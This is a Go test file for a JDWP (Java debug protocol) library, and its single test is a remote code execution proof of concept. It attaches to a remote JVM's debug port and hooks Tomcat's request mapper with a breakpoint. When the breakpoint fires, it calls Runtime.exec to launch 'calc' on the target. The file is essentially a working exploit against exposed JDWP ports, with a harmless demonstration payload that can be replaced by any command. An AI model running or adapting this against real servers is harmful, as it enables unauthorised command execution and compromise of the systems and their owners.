package impl

import (
	"context"
	jdi "github.com/kyo-w/jdwp"
	"testing"
)

func TestVm(t *testing.T) {
	vm, _ := Attach(context.Background(), "192.168.116.100:5005")
	signature := vm.GetClassesByName("org.apache.catalina.mapper.Mapper")[0]
	for _, value := range signature.GetAllMethods() {
		if value.GetName() == "internalMap" {
			location := value.GetLocation()
			request := vm.GetEventRequestManager().CreateBreakpointRequest(location)
			request.SetSuspendPolicy(jdi.SuspendEventThread)
			request.SetHandler(func(eventObject jdi.EventObject) bool {
				object := eventObject.(EventBreakpointResponseObject)
				thread := object.GetThread()
				bySignature := thread.GetVirtualMachine().GetClassesByName("java.lang.Runtime")[0]
				method := bySignature.GetMethodsByName("getRuntime")[0]
				ref, _ := bySignature.(jdi.ClassType).InvokeMethod(thread, method, []jdi.Value{}, jdi.InvokeNonvirtual)
				method1 := ref.(jdi.ObjectReference).GetType().(jdi.ClassType).GetMethodsByName("exec")[0]
				args := make([]jdi.Value, 1)
				args[0] = ref.GetVirtualMachine().MirrorOfString("calc")
				ref.(jdi.ObjectReference).InvokeMethod(thread, method1, args, jdi.InvokeSingleThreaded)
				return false
			})
			request.Enable()
		}
	}
	select {}
}
